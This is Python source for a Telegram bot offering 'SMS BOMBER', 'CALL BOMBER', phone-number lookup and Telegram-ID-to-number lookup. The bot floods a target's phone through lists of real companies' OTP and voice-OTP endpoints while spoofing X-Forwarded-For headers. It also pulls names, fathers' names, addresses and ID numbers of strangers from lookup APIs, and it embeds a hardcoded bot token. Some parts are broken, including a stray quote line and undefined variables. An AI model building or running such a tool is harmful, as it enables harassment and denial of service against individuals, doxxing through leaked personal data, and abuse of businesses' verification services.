import requests
import time
import json
import random
import threading
from datetime import datetime

BOT_TOKEN = "8620677010:AAEUcNXfDU0T6x_sFitPUzyKx4SkWdnZFZ4"
DEVELOPER = "DIE"
OWNER = "@TG_SURAJ_OWNER"




Owner: @TG_SURAJ_OWNER"""

USERS_FILE = "users_data.json"
USERS = set()
CACHE = {}
BOMBING_ACTIVE = {}
BOMBING_STATS = {}

def load_users():
    global USERS
    try:
        with open(USERS_FILE, "r") as f:
            data = json.load(f)
            USERS = set(data.get("users", []))
    except:
        USERS = set()

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump({"users": list(USERS)}, f)

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_telegram_photo(chat_id, photo_url, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data = {"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

def send_typing(chat_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendChatAction"
    data = {"chat_id": chat_id, "action": "typing"}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

# ========= KEYBOARD =========
def main_keyboard():
    return {
        "keyboard": [
            ["📞 NUMBER LOOKUP", "🆔 TG ID TO NUMBER"],
            ["💣 SMS BOMBER", "📞 CALL BOMBER"],
            ["📊 STATS", "🛑 STOP BOMB"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# ========= NUMBER LOOKUP API =========
def number_lookup_api(num):
    if num == PROTECTED_NUMBER:
        return "PROTECTED"
    try:
        url = f"https://darkietech.site/numapi.php?action=api&key=AKASH&number={num}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list) and len(data) > 0:
                return data
        return None
    except:
        return None

def number_lookup_backup(num):
    if num == PROTECTED_NUMBER:
        return "PROTECTED"
    try:
        url = f"https://num-to-info-ten.vercel.app/?num={num}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("success") and data.get("data"):
                return [{
                    "NAME": data.get("data", {}).get("name", "N/A"),
                    "fname": data.get("data", {}).get("father_name", "N/A"),
                    "ADDRESS": data.get("data", {}).get("address", "N/A"),
                    "circle": data.get("data", {}).get("operator", "N/A"),
                    "MOBILE": num,
                    "alt": data.get("data", {}).get("alt_mobile", "N/A"),
                    "id": data.get("data", {}).get("aadhaar", "N/A")
                }]
        return None
    except:
        return None

def tgid_to_number_api(userid):
    if str(userid) == PROTECTED_TG_ID or str(userid).lower() == PROTECTED_TG_USERNAME.lower():
        return "PROTECTED"
    try:
        url = f"https://cyber-osint-tg-num.vercel.app/api/tginfo?key=Rogers2&id={userid}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("result") == True and data.get("number"):
                return {
                    "number": data.get("number"),
                    "country": data.get("country", "Unknown"),
                    "country_code": data.get("country_code", "+91"),
                    "tg_id": userid,
                    "developer": DEVELOPER
                }
        return None
    except:
        return None

# ========= 82 SMS BOMBING APIS =========
SMS_APIS = [
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Byju's", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&mobile_number={p}&platform=ANDROID"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "1MG", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'},
    {"name": "Swiggy", "url": "https://profile.swiggy.com/api/v3/app/request_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zomato", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=sms"},
    {"name": "Ola", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Tata Capital", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "BigCash", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {}, "data": None},
    {"name": "WorkIndia", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vyapar", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
    {"name": "ConfirmTkt", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "AstroSage", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "CodFirm", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Babaji Clubs", "url": "https://api.babajiclubs.com/api/users/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mob={p}&dev_id=123456789&app_id=com.babaji.galigame"},
]

# ========= CALL BOMBING APIS (POWERFUL) =========
CALL_APIS = [
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
]

print(f"Loaded {len(SMS_APIS)} SMS APIs")
print(f"Loaded {len(CALL_APIS)} Call APIs")

def send_request(api, phone):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36"}
        headers.update(api.get("headers", {}))
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        url = api["url"] if not callable(api["url"]) else api["url"](phone)
        data = api["data"](phone) if api["data"] and callable(api["data"]) else api["data"]
        
        if api["method"] == "POST":
            if "application/x-www-form-urlencoded" in str(headers.get("Content-Type", "")):
                response = requests.post(url, data=data, headers=headers, timeout=3)
            else:
                if data and isinstance(data, str):
                    try:
                        response = requests.post(url, json=json.loads(data), headers=headers, timeout=3)
                    except:
                        response = requests.post(url, data=data, headers=headers, timeout=3)
                else:
                    response = requests.post(url, headers=headers, timeout=3)
        else:
            response = requests.get(url, headers=headers, timeout=3)
        
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

def bombing_worker(chat_id, phone, bomb_type):
    BOMBING_ACTIVE[chat_id] = True
    BOMBING_STATS[chat_id] = {"success": 0, "failed": 0, "total": 0, "type": bomb_type}
    
    apis = CALL_APIS if bomb_type == "call" else SMS_APIS
    
    while BOMBING_ACTIVE.get(chat_id, False):
        for api in apis:
            if not BOMBING_ACTIVE.get(chat_id, False):
                break
            result = send_request(api, phone)
            BOMBING_STATS[chat_id]["total"] += 1
            if result:
                BOMBING_STATS[chat_id]["success"] += 1
            else:
                BOMBING_STATS[chat_id]["failed"] += 1
        time.sleep(0.01)
    
    BOMBING_STATS[chat_id]["running"] = False

def send_bombing_stats(context, chat_id):
    if chat_id in BOMBING_ACTIVE and BOMBING_ACTIVE[chat_id]:
        stats = BOMBING_STATS.get(chat_id, {"success": 0, "failed": 0, "total": 0})
        bomb_type = stats.get("type", "SMS")
        emoji = "💣" if bomb_type == "SMS" else "📞"
        status_text = f"""{emoji} {bomb_type} BOMBING ACTIVE {emoji}
━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ SUCCESS: {stats['success']}
❌ FAILED: {stats['failed']}
📈 TOTAL: {stats['total']}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 TARGET PHONE HANGING...
👑 {OWNER}"""
        send_telegram_message(chat_id, status_text)

def handle_message(chat_id, text, username):
    if text == "/start":
        if chat_id not in USERS:
            USERS.add(chat_id)
            save_users()
        
        welcome_text = f"""🔥 WELCOME {username} 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
👨‍💻 DEVELOPER: {DEVELOPER}
👑 OWNER: {OWNER}
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 NUMBER LOOKUP
🆔 TG ID TO NUMBER
💣 SMS BOMBER ({len(SMS_APIS)} APIs)
📞 CALL BOMBER ({len(CALL_APIS)} APIs)
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬇️ SEND A BUTTON OPTION BELOW ⬇️"""
        
        send_telegram_message(chat_id, welcome_text, main_keyboard())
    
    elif text == "📞 NUMBER LOOKUP":
        send_telegram_message(chat_id, "📞 Send target number (10 digits):")
        return "awaiting_number"
    
    elif text == "🆔 TG ID TO NUMBER":
        send_telegram_message(chat_id, "🆔 Send Telegram User ID (numeric only):")
        return "awaiting_tgid"
    
    elif text == "💣 SMS BOMBER":
        send_telegram_message(chat_id, "💣 Send target number (10 digits) for SMS BOMBING\n\n⚠️ Press 🛑 STOP BOMB to stop")
        return "awaiting_sms_bomb"
    
    elif text == "📞 CALL BOMBER":
        send_telegram_message(chat_id, "📞 Send target number (10 digits) for CALL BOMBING\n\n⚠️ Press 🛑 STOP BOMB to stop")
        return "awaiting_call_bomb"
    
    elif text == "📊 STATS":
        active_count = len([x for x in BOMBING_ACTIVE.values() if x])
        stats_text = f"""📊 BOT STATS
━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 USERS: {len(USERS)}
💣 SMS APIs: {len(SMS_APIS)}
📞 CALL APIs: {len(CALL_APIS)}
🎯 ACTIVE BOMB: {active_count}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER}"""
        send_telegram_message(chat_id, stats_text)
        return None
    
    elif text == "🛑 STOP BOMB":
        if chat_id in BOMBING_ACTIVE and BOMBING_ACTIVE[chat_id]:
            BOMBING_ACTIVE[chat_id] = False
            time.sleep(1)
            stats = BOMBING_STATS.get(chat_id, {"success": 0, "failed": 0, "total": 0})
            final_report = f"""🛑 BOMBING STOPPED 🛑
━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ SUCCESS: {stats['success']}
❌ FAILED: {stats['failed']}
📈 TOTAL: {stats['total']}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER}"""
            send_telegram_message(chat_id, final_report, main_keyboard())
            del BOMBING_ACTIVE[chat_id]
            if chat_id in BOMBING_STATS:
                del BOMBING_STATS[chat_id]
        else:
            send_telegram_message(chat_id, "❌ No active bombing session!", main_keyboard())
        return None
    
    elif text.isdigit() and len(text) >= 10:
        num = text[:10]
        
        if num == PROTECTED_NUMBER:
            send_telegram_message(chat_id, WARNING_MSG, main_keyboard())
            return None
        
        msg = send_telegram_message(chat_id, "🔍 FETCHING INFORMATION...")
        
        if num in CACHE:
            data = CACHE[num]
        else:
            data = number_lookup_api(num)
            if not data or data == "PROTECTED":
                data = number_lookup_backup(num)
            CACHE[num] = data
        
        if data and data != "PROTECTED" and isinstance(data, list) and len(data) > 0:
            result = f"""📞 NUMBER LOOKUP RESULT
━━━━━━━━━━━━━━━━━━━━━━━━━━
TARGET: {num}
RECORDS: {len(data)}
━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            for i, r in enumerate(data, start=1):
                address = r.get('ADDRESS', 'N/A')
                if address != 'N/A':
                    address = address.replace('!!', ', ').replace('!', ', ')
                
                result += f"""
📋 RECORD {i}
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 MOBILE: {r.get('MOBILE', 'N/A')}
👤 NAME: {r.get('NAME', 'N/A')}"""
                if r.get("fname"):
                    result += f"\n👨 FATHER: {r.get('fname')}"
                if address != 'N/A':
                    result += f"\n📍 ADDRESS: {address[:50]}"
                if r.get("circle"):
                    result += f"\n📡 CIRCLE: {r.get('circle')}"
                result += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
            result += f"\n👑 {OWNER}"
        else:
            result = f"❌ No data found for {num}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👑 {OWNER}"
        
        send_telegram_message(chat_id, result[:4096], main_keyboard())
        return None
    
    return None

def main():
    load_users()
    
    print("╔════════════════════════════════════╗")
    print("║     🔥 BOT STARTED SUCCESSFULLY 🔥    ║")
    print("╠════════════════════════════════════╣")
    print(f"║  👑 DEVELOPER: {DEVELOPER}              ║")
    print(f"║  👑 OWNER: {OWNER}                      ║")
    print(f"║  📊 USERS: {len(USERS)}                           ║")
    print(f"║  💣 SMS APIs: {len(SMS_APIS)}                          ║")
    print(f"║  📞 CALL APIs: {len(CALL_APIS)}                          ║")
    print(f"║  🛡️ PROTECTED: {PROTECTED_NUMBER}     ║")
